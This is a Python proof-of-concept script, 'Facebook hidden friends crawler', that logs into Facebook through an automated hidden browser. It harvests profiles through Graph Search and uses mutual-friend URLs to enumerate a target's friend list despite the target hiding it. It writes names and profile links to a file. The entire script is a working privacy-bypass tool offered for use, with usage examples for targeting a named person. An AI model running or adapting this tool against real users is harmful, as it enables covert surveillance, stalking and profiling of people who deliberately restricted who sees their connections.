#!/usr/bin/env python
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from StringIO import StringIO
from colorama import init
from colorama import Fore, Back, Style
from pyvirtualdisplay import Display
import lxml.html
import time
import re
import requests
import argparse
import sys
import os.path

init(autoreset=True)

print "-----------------------------------------------------------------------------"
print "          Facebook hidden friends crawler POC - by Shay Priel"
print "-----------------------------------------------------------------------------"
print Fore.BLACK + Style.BRIGHT + "                    .@@@@." + Fore.RESET + "                         .:::,           :;::         "
print Fore.BLACK + Style.BRIGHT + "  lCCCf;            .@@@@.                         " + Fore.RESET + ".:::,           ::::         "
print Fore.BLACK + Style.BRIGHT +  " C@@@@@@t lLLL, tLLL,@@@@iCGL:   :fGGGf,  fLLf:CGf" + Fore.RESET + "..:::,.,,,.,::.  ::::         "
print Fore.BLACK + Style.BRIGHT + "i@@@@@@@@,l@@@; G@@@.@@@@@@@@@, ;@@@@@@@: G@@@@@@@C" + Fore.RESET + ".:::,,::::::::..::::,        "
print Fore.BLACK + Style.BRIGHT +  "C@@@C@@@@l;@@@l G@@C.@@@@@@@@@t.@@@@@@@@G.@@@@@@@@@" + Fore.RESET + ".:::,,::::::::,.::::,        "
print Fore.BLACK + Style.BRIGHT +  "@@@@.i@@@l.@@@f @@@L.@@@@ii@@@C;@@@C.G@@@,@@@@;@@@@" + Fore.RESET + ".:::,,:::, ::::.::::,        "
print Fore.BLACK + Style.BRIGHT +  "@@@@ ;@@@l G@@L.@@@t.@@@@.,@@@Ci@@@l L@@@,@@@G G@@@" + Fore.RESET + ".:::,,:::. ,::: ::::         "
print Fore.BLACK + Style.BRIGHT +  "@@@@ ;@@@l L@@C,@@@;.@@@@.,@@@Gi@@@i f@@@,@@@G G@@@" + Fore.RESET + ".:::,,:::  ,::: ::::         "
print Fore.BLACK + Style.BRIGHT +  "@@@@  ,,,. t@@G;@@@..@@@@.,@@@Ci@@@CfG@@@,@@@G G@@@" + Fore.RESET + ".:::,,:::  :::: ::::         "
print Fore.BLACK + Style.BRIGHT +  "@@@@       i@@Gl@@G .@@@@.,@@@Ci@@@@@@@@@,@@@G G@@@" + Fore.RESET + ".:::,,:::  :::: ::::         "
print Fore.BLACK + Style.BRIGHT +  "@@@@   .   :@@@f@@L .@@@@.,@@@Ci@@@@GGGGG,@@@G ....." + Fore.RESET + ":::,,:::  :::: ::::         "
print Fore.BLACK + Style.BRIGHT +  "@@@@ ;@@@t .@@@G@@t .@@@@.,@@@Ci@@@l      @@@G     " + Fore.RESET + ".:::,,:::  :::: ::::         "
print Fore.BLACK + Style.BRIGHT +  "@@@@ ;@@@f  G@@@@@i .@@@@.,@@@Ci@@@l fGGG,@@@G     " + Fore.RESET + ".:::,,:::  :::: ::::         "
print Fore.BLACK + Style.BRIGHT +  "@@@@ ;@@@f  L@@@@@: .@@@@.,@@@Ci@@@l f@@@,@@@G     " + Fore.RESET + ".:::,,:::  :::: ::::         "
print Fore.BLACK + Style.BRIGHT +  "@@@@,i@@@f  l@@@@@. .@@@@,,@@@Ci@@@t C@@@,@@@G     " + Fore.RESET + ".:::,,:::  :::: ::::         "
print Fore.BLACK + Style.BRIGHT +  "G@@@G@@@@l  ;@@@@C  .@@@@LL@@@L:@@@@t@@@@,@@@G     " + Fore.RESET + ".:::,,:::  :::: ::::"+ Fore.RED +"lilll.   "
print Fore.BLACK + Style.BRIGHT +  "i@@@@@@@@.  ,@@@@f  .@@@@@@@@@i C@@@@@@@L.@@@G     " + Fore.RESET + " :::,,:::. :::: ::::"+ Fore.RED +"llttt.   "
print Fore.BLACK + Style.BRIGHT +  "t@@@@@@i  .;@@@@i  .@@@@f@@@C  ,G@@@@@C  @@@G     " + Fore.RESET + ".:::.,:::  ,::: .:::,"+ Fore.RED +"ltttl.    "
print "-----------------------------------------------------------------------------"
print "Examples:"
print "1. Generates related public profiles:"
print "python fb-hfc.py -username <username>  -password '<password>' \n-query '<graph search query>' -output <output.txt>"
print "2. Exctracting hidden friends:"
print "python fb-hfc.py -username <username>  -password '<password>' \n-target <target> -profilesfile <file.txt> -output <output.txt>"
print "-----------------------------------------------------------------------------"
#args



parser = argparse.ArgumentParser(usage="-h for full usage")
parser.add_argument('-username', dest="username", help='facebook username to login with (e.g. example@example.com)',required=True)
parser.add_argument('-password', dest="password", help='facebook password to login with (e.g. \'password\')',required=True)

parser.add_argument('-query', dest="query", help='graph search query (e.g. "People That Work in Company")',required=False)
parser.add_argument('-output', dest="output", help='File name to save results',required=False)

parser.add_argument('-target', dest="target", help='(e.g. "text.example")',required=False)
parser.add_argument('-profilesfile', dest="profilesfile", help='File name that contains list of profiles with public friends',required=False)

args = parser.parse_args()

if args.query is None and args.target is None:
	parser.error("You must give atleast one method -query or -target")

if args.query and args.target:
	parser.error("-query and -target cannot run together")

if args.target and args.profilesfile is None:
	parser.error("You must provide -profilesfile")

if args.query and args.profilesfile:
	parser.error("-query and -profilesfile cannot run together")

if args.query and args.output is None:
	parser.error("You must provide -output")

if args.target and args.output is None:
	parser.error("You must provide -output")


def facebook_login(username,password):
	print ("\n\n\nLogin to Facebook...."),
	sys.stdout.flush() 
	url = "http://www.facebook.com"
	driver.get(url)
	elem = driver.find_element_by_id("email")
	elem.send_keys(username)
	elem = driver.find_element_by_id("pass")
	elem.send_keys(password)
	elem.send_keys(Keys.RETURN)
	time.sleep(1)
	html_source = driver.page_source
	if "Please re-enter your password" in html_source or "Incorrect Email" in html_source:
		print Fore.RED + "Incorrect Username or Password"
		driver.close()
		exit()
	else:
		print Fore.GREEN + "Success\n"
	return driver.get_cookies()

def request_url(url,get_cookies):
	all_cookies = dict()
	for cookie in get_cookies:
		all_cookies[cookie["name"]]=cookie["value"]
	r = requests.get(url,cookies=all_cookies)
	html = r.content
	return html

def graph_search(graph_search_query):
	print ("Searching for: \"" + Fore.YELLOW + graph_search_query + Fore.RESET + "\"..."),
	sys.stdout.flush() 
	driver.implicitly_wait(5)
	time.sleep(1)
	elem = driver.find_element_by_xpath("//div[@class='_586i']")
	elem.click()
	elem.send_keys(graph_search_query)
	elem.send_keys(Keys.RETURN)
	print Fore.GREEN + "Done\n"
#collect usernames
def extract_profiles():
	while True:
		time.sleep(1)

		try:
			elem = driver.find_element_by_xpath(".//th[@class='_4311']")
		except:
			print "Invalid graph search query! (hint: first try it on facebook)"
			driver.close()
			exit()

		try:
			print "Extracting Profiles...\n"
			driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")

			elem = driver.find_element_by_xpath("//div[@class='phm _64f']")
			if "End of results" in elem.text:
				break
		except:
			pass



	xpath_name_params = ".//a[@class='_7kf _8o _8s lfloat _ohe']/@href"


	html_source = driver.page_source

	html_lxml = lxml.html.parse(StringIO(html_source)) #parse to lxml object
	params_result = html_lxml.xpath(xpath_name_params)

	data = list()

	for prm in params_result:

		if "profile.php" in prm:
			result = re.search('(?<=\profile\.php\?id=)(.*\n?)(?=&ref)', prm)
			data.append(result.group())
		else:
			result = re.search('(?<=\.com\/)(.*\n?)(?=\?)', prm)
			data.append(result.group())

	print "Enumerating %s profiles...\n" % len(data)
	return data

def extract_mutual_friends(profiles_urls):
	print "Enumerating hidden friends from: " + Fore.YELLOW + target + "\n"
	data = list()
	for profile_url in profiles_urls:
		elem = driver.get(profile_url)
		print "Enumerating mutual friends: %s" % profile_url

		while True:

			time.sleep(2)
			try:
				elem = driver.find_element_by_xpath(".//a[@class='pam uiBoxLightblue uiMorePagerPrimary']")
				elem.click()
			except:
				break


		xpath_name_params = ".//div[@class='fsl fwb fcb']/a/@href"
		xpath_name_params2 = ".//div[@class='fsl fwb fcb']/a/text()"

		html_source = driver.page_source

		html_lxml = lxml.html.parse(StringIO(html_source)) #parse to lxml object
		params_result = html_lxml.xpath(xpath_name_params)
		params_result2 = html_lxml.xpath(xpath_name_params2)
		
		for prm,prm2 in zip(params_result,params_result2):

			if "profile.php" in prm:
				result = re.search('(?<=\profile\.php\?id=)(.*\n?)(?=&fref=pb_other)', prm)
				if result.group() not in data:
					data.append(result.group())
				if prm2 not in data:
					data.append(prm2)
			else:
				result = re.search('(?<=\.com\/)(.*\n?)(?=\?)', prm)
				if result.group() not in data:
					data.append(result.group())
				if prm2 not in data:
					data.append(prm2)

	print Fore.GREEN + "\nTotal of %s hidden friends have been found\n" % str(len(data))
	return data



def check_if_public(profiles,cookies):
	print "Searching for public profiles...\n"
	xpath_name_params = ".//a[@id='u_0_1i']/span[@class='_3sz']/text()"
	public_profile = list()
	digits = re.compile('\d')

	for profile in profiles:
		if profile.isdigit():
			profile_url = "https://www.facebook.com/profile.php?id=%s&sk=friends" % profile
			print("Checking Profile: %s......" % profile),
			sys.stdout.flush() 
		else:
			profile_url = "https://www.facebook.com/%s/friends" % profile
			print("Checking Profile: %s......" % profile),
			sys.stdout.flush() 
		
		html = request_url(profile_url,cookies)

		if "All Friends" in html:
			public_profile.append(profile)
			print Fore.GREEN + "Public"
		else:
			print Fore.RED + "None Public"
	# ADD SOME MORE SOUCE .//span[@class='_3sz']/text()
	#print html
	print "\nTotal of %s public profiles have been found\n" % str(len(public_profile))
	return set(public_profile)


def generate_mutual_link(profilesfile,target):
	mutual_url = list()
	for profile in profilesfile:
		mutual_url.append("https://www.facebook.com/%s/friends?and=%s" % (target,profile))

	return mutual_url

def open_file(filename):
	results = list()
	with open(filename, 'r') as myFile:
		for line in myFile.readlines():
			results.append(line.strip())
	return results


def save_file(filename,results):
	if args.profilesfile:
		line_items = 2
		with open(filename, 'w') as myFile:
			for n, user in enumerate(results):
				if (n+1) % line_items:
					if user.isdigit():
						profile_url = "https://www.facebook.com/profile.php?id=%s" % user
					else:
						profile_url = "https://www.facebook.com/%s" % user
					myFile.write("Username: " + user.encode('utf8')+"\n")
				else:
					myFile.write("Full Name: " + user.encode('utf8')+"\n"+"Link to Profile: " + profile_url.encode('utf8')+"\n\n")
	else:	
		with open(filename, 'w') as myFile:
			for user in results:
				myFile.write(user.encode('utf8')+"\n")
	print "Saving results to: %s\n\n" % filename


target = args.target
username = args.username
password = args.password
filename = args.output
graph_search_query = args.query
profilesfile = args.profilesfile

if args.target and args.profilesfile: 
	if not os.path.isfile(profilesfile):
		print profilesfile +" file doesn't exist"
		exit()




display = Display(visible=0, size=(1600, 900))
display.start()

driver = webdriver.Firefox()

cookies = dict()
cookies = facebook_login(username,password)
#print cookies


if args.query:
	graph_search(graph_search_query)
	results = extract_profiles()
	results = check_if_public(results,cookies)
	save_file(filename,results)
	driver.close()
	exit()


if args.target: 
		profiles = open_file(profilesfile)
		results = generate_mutual_link(profiles,target)
		results = extract_mutual_friends(results)
		save_file(filename,results)
		driver.close()
		exit()

